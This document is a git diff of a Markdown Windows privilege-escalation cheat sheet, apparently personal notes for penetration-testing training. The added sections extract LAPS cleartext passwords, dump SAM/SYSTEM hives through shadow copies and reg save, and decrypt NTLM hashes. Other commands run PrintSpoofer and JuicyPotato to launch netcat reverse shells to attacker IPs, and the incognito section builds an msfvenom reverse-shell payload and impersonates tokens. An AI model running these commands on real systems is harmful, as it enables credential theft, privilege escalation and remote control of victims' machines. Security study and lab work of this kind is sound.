@@ -249,6 +249,28 @@ tasklist /SVC
 
 <details>
 
+<summary>Local Administrator Password Solution (LAPS)</summary>
+
+* Secure and scalable way of remotely managing the local administrator password for domain-joined computers
+* 2 new attributes for computer object
+  * ms-mcs-AdmPwdExpirationTime
+    * Registers the expiration time of a password as directed through a group policy
+* ms-mcs-AdmPwd
+  * Contains the clear text password of the local administrator account
+  * Confidential, specific read permissions are required to access the content
+
+```
+git clone https://github.com/leoloobeek/LAPSToolkit.git
+Import-Module .\LAPSToolkit.ps1
+Get-LAPSComputers --> show LAPS enabled computers && cleartext password if any
+Find-LAPSDelegatedGroups --> Get the groupname that can view LAPS passwords
+Get-NetGroupMember -GroupName "XXX" --> Find the accounts that can view LAPS passwords
+```
+
+</details>
+
+<details>
+
 <summary>Files &#x26; Directories </summary>
 
 Use `dir /a` to see hidden files (eg: `.git` files)
@@ -275,9 +297,7 @@ accesschk.exe -uws "Everyone" "C:\Program Files"
 
 * AccessChk from SysInternals
 
-<!---->
-
-* Powershell cmd to find files that can be modified by everyone
+- Powershell cmd to find files that can be modified by everyone
 
 ```shell
 Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
@@ -634,6 +654,51 @@ echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
 
 <details>
 
+<summary>Dumping Local NTLM Hashes</summary>
+
+* Need to extract out SYSTEM and SAM registry hives but they are locked by SYSTEM process --> unable to read/copy the files
+* Create a volume snapshot
+  * ```
+    wmic shadowcopy call create Volume='C:'
+    ```
+  * ```
+    vssadmin list shadows
+    ```
+  * ```
+    copy 
+    \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam
+     C:\users\offsec.corp1\Downloads\sam
+    ```
+  * ```
+    copy 
+    \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system
+     C:\users\offsec.corp1\Downloads\system
+    ```
+* Using reg save
+  * ```
+    reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
+    ```
+  * ```
+    reg save HKLM\system C:\users\offsec.corp1\Downloads\system
+    ```
+* Decrypt the SYSTEM & SAM files
+  * creddump
+    *   ```
+        git clone https://github.com/Tib3rius/creddump7
+        cd creddump7
+        python3 -m venv venv
+        pip3 uninstall crypto 
+        pip3 uninstall pycrypto 
+        install pycryptodome
+        python3 pwdump.py ../system1 ../sam1 
+        ```
+
+
+
+</details>
+
+<details>
+
 <summary>Security Account Manger (SAM) Dump</summary>
 
 * Located in `c:\windows\system32\config`
@@ -744,16 +809,12 @@ Works on all versions of Server 2016 and Server 2019, as well as every version o
 
 * [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
 
-<!---->
-
-* From Local/NETWORK SERVICE to system by abusing SeImpersonatePrivilege
-
-<!---->
+- From Local/NETWORK SERVICE to system by abusing SeImpersonatePrivilege
 
 * This step is purely to simulate getting a service account shell
 
 ```bash
-printspoofer32.exe -c "nc.exe -e cmd.exe 10.10.14.6 4444"
+.\printspoofer64.exe -c "nc64.exe -e cmd.exe 192.168.45.213 53"
 ```
 
 ```bash
@@ -776,10 +837,8 @@ Does not work on Win10 version >= 1809, Server2019. Check Win10 versions [here](
 
 * [https://github.com/ohpe/juicy-potato/releases/tag/v0.1](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)
 
-<!---->
-
-* `SeImpersonatePrivilege` is enabled —> vuln to JuicyPotato PrivEsc
-* Transfer nc.exe `copy \\10.10.14.6\share\nc32.exe .`
+- `SeImpersonatePrivilege` is enabled —> vuln to JuicyPotato PrivEsc
+- Transfer nc.exe `copy \\10.10.14.6\share\nc32.exe .`
 
 ```bash
 juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\kohsuke\Desktop\nc32.exe -e cmd.exe 10.10.14.6 4444" -t *
@@ -814,19 +873,22 @@ COM -> recv failed with error: 10038
 
 <summary>Incognito</summary>
 
-[https://github.com/milkdevil/incognito2/blob/master/incognito.exe](https://github.com/milkdevil/incognito2/blob/master/incognito.exe)
+* Manual way: [https://github.com/milkdevil/incognito2/blob/master/incognito.exe](https://github.com/milkdevil/incognito2/blob/master/incognito.exe)
+  * ```
+    incognito.exe list_tokens -u
+    msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=80 -f exe -o reverse_80.exe
+    incognito.exe execute -c "sandbox\Administrator" reverse_80.exe
+    ```
 
-```bash
-incognito.exe list_tokens -u
-```
+- Metasploit's method:
+  * ```
+    load incognito
+    list_tokens -u      (Delegation tokens allow full authentication, while Impersonation tokens allow acting as another user.)
+    impersonate_token corp1\\admin
+    getuid
+    ```
 
-```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=80 -f exe -o reverse_80.exe
-```
 
-```bash
-incognito.exe execute -c "sandbox\Administrator" reverse_80.exe
-```
 
 </details>
 
@@ -840,9 +902,7 @@ Requires SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege
 
 * [Rogue Potato ](https://github.com/antonioCoco/RoguePotato/releases/tag/1.0)
 
-<!---->
-
-* Setting up a spoofed OXID resolver
+- Setting up a spoofed OXID resolver
   * Forwards Kali port 135 to port 9999 on Windows.
 
 ```bash
@@ -865,9 +925,7 @@ socat tcp-listen:135,reuseaddr,fork tcp:<victim's IP>:9999
 
 * Checks the “user” account’s permissions on the ”daclsvc” service
 
-<!---->
-
-* “user” account has the permission to change the service config (SERVICE\_CHANGE\_CONFIG)
+- “user” account has the permission to change the service config (SERVICE\_CHANGE\_CONFIG)
 
 ```shell
 C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
